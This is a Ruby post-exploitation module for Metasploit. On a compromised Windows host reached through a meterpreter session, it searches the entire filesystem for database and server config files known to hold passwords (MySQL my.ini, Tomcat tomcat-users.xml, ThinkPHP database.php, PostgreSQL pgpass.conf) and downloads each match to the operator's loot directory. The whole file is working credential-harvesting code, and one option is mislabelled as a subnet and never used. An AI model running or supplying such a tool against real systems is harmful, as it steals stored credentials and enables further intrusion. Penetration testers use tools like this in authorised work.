##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'csv'
require 'time'

class MetasploitModule < Msf::Post
  include Msf::Post::File



  def initialize(info = {})
    super(update_info(info,
                      'Name'         => 'gather password in config files',
                      'Description'  => %q{
          get passwords in config files,like my.ini,tomcat-users.xml.
        },
                      'License'      => MSF_LICENSE,
                      'Author'       => [
                              'viper' # @JonValt
                      ],
                      'Platform'     => %w{ win },
                      'SessionTypes' => ['meterpreter']
          ))
    register_options(
            [
                    OptInt.new('FILESIZELIMIT', [false, 'Subnet (IPv4, for example, 10.10.10.0)', nil]),
            ])
  end

  #
  # Execute the module.
  #
  def run

    files_to_gather = [
            {:name => "mysql", :configfile => "my.ini", },
            {:name => "tomcat", :configfile => "tomcat-users.xml", },
            {:name => "thinkphp", :configfile => "database.php", }, # 'password'　　=> 'root',
            {:name => "postgresql", :configfile => "pgpass.conf", },
    # {:name => "asp.net", :configfile => "web.config", },# Password=

    ]

    gather_files = []
    files_to_gather.each do |config|
      files = session.fs.file.search(nil, config[:configfile], true, timeout = 360)

      config['files'] = []

      files.each do |file|
        locatfilename = Time.now.to_i.to_s + "_" + file['name']
        localpath     = File.join(Msf::Config.loot_directory, locatfilename)
        remotepath    = File.join(file['path'], file['name'])
        client.fs.file.download_file(localpath, remotepath)
        file['localpath'] = locatfilename
        config['files'] << file
      end
      gather_files << config
    end
    pub_json_result(true,
                    nil,
                    gather_files,
                    self.uuid)
    return

  end

end
